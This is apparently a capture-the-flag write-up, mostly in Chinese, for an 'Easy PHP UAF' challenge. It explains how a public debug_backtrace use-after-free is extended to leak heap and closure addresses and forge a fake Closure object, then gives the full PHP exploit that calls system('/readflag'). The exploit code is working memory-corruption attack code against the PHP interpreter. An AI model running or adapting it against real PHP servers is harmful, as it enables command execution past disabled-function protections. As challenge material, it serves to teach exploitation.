[中文](./README_zh.md) [English](./README.md)

[docker](./PHP-UAF.tar.gz)

# Easy PHP UAF 题解

## 题解:
题目基于一个公开exp：https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php ，它利用了debug_backtrace函数的bug来实现一个UAF漏洞。通过这个漏洞，我们可以读写PHP内存。

要解出这道题，需要一些PHP底层相关的知识和一点点Pwn相关的思想。

为了加大题目的难度，我加了一些料：

1. 在词法分析里面ban掉了循环结构
2. 在扩展里面限制了函数执行深度
3. 在php.ini里面ban掉了strlen，需要用别的方式泄露内存

如果用gdb调试并弄懂原本的exp的原理，这道题目其实非常简单：

1. UAF，可以直接用原exp里面的
2. 泄露下一个PHP堆块的头指针，用于计算$helper和$abc的存放地址
3. 泄露Closure Object的存放地址
4. 改写$helper->a，将它伪造成一个指向Closure Object的字符串
5. 从Closure Object里面泄露出Closure Handlers的地址，然后计算system的地址
6. 将需要用到的Closure Object数据复制到下一个PHP堆块上面，将它的internal_function.handler改写成system地址，然后改写$helper->b，让它指向这个假的Closure Object
7. 执行$helper->b来执行system


## Exp:
```php
pwn("/readflag");

function pwn($cmd) {
    global $abc, $helper, $backtrace;
    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this -> a);
            $backtrace = (new Exception) -> getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }
    class Helper {
        public $a, $b, $c, $d;
    }
    function str2int($str) {
        $address = 0;
        $address |= ord($str[4]);
        $address <<= 8;
        $address |= ord($str[5]);
        $address <<= 8;
        $address |= ord($str[6]);
        $address <<= 8;
        $address |= ord($str[7]);
        return $address;
    }
    function leak($offset) {
        global $abc;
        return strrev(substr($abc, $offset, 8));
    }
    function leakA($offset) {
        global $helper;
        return strrev(substr($helper -> a, $offset, 8));
    }
    function write($offset, $data) {
        global $abc;
        $abc[$offset] = $data[7];
        $abc[$offset + 1] = $data[6];
        $abc[$offset + 2] = $data[5];
        $abc[$offset + 3] = $data[4];
        $abc[$offset + 4] = $data[3];
        $abc[$offset + 5] = $data[2];
        $abc[$offset + 6] = $data[1];
        $abc[$offset + 7] = $data[0];
    }
    function trigger_uaf($arg) {
        $arg = str_repeat('A', 79);
        $vuln = new Vuln();
        $vuln -> a = $arg;
    }
    # UAF
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];
    $helper = new Helper;
    $helper -> b = function ($x) { };
    # leak head point of next php heap
    $php_heap = leak(0x88);
    echo "PHP Heap: " . bin2hex($php_heap) . "\n";
    $abc_address = str2int($php_heap) - 0x88 - 0xa0;
    echo '$abc: ' . dechex($abc_address) . "\n";
    $closure_object = leak(0x20);
    echo "Closure Object: " . bin2hex($closure_object) . "\n";
    # let a point to closure_object
    write(0x10, substr($php_heap, 0, 4) . hex2bin(dechex(str2int($closure_object) - 0x28)));
    write(0x18, str_pad("\x06", 8, "\x00", STR_PAD_LEFT));
    # leak Closure Handlers
    $closure_handlers = leakA(0x28);
    echo "Closure Handlers: " . bin2hex($closure_handlers) . "\n";
    # compute system address
    $system_address = dechex(str2int($closure_handlers) - 10733946);
    echo "System: " . $system_address . "\n";
    # build fake closure_object
    write(0x90, leakA(0x10));
    write(0x90 + 0x08, leakA(0x18));
    write(0x90 + 0x10, leakA(0x20));
    write(0x90 + 0x18, leakA(0x28));
    $abc[0x90 + 0x38] = "\x01";
    write(0x90 + 0x68, substr($php_heap, 0, 4) . hex2bin($system_address));
    # let b get this object
    write(0x20, substr($php_heap, 0, 4) . hex2bin(dechex(str2int($php_heap) + 0x08 - 0xa0)));
    # eval system
    ($helper -> b)($cmd);
    exit();
}
```

